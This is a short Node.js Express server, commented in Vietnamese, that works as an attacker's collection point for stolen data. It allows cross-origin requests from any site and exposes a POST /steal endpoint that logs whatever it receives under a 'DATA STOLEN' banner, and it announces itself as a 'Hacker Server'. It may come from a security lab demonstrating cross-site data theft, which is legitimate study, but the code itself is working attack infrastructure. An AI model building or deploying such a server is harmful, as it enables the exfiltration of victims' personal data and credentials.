const express = require("express");

const app = express();

app.use(express.json());

// Cho phép CORS
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "*");
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");

    if (req.method === "OPTIONS") {
        return res.sendStatus(204);
    }

    next();
});

// Nhận dữ liệu bị đánh cắp
app.post("/steal", (req, res) => {

    console.log("\n==============================");
    console.log("===== DATA STOLEN =====");
    console.log(req.body);
    console.log("==============================\n");

    res.status(200).json({
        success: true,
        message: "Data received"
    });

});

app.listen(4000, () => {
    console.log("Hacker Server running on port 4000");
});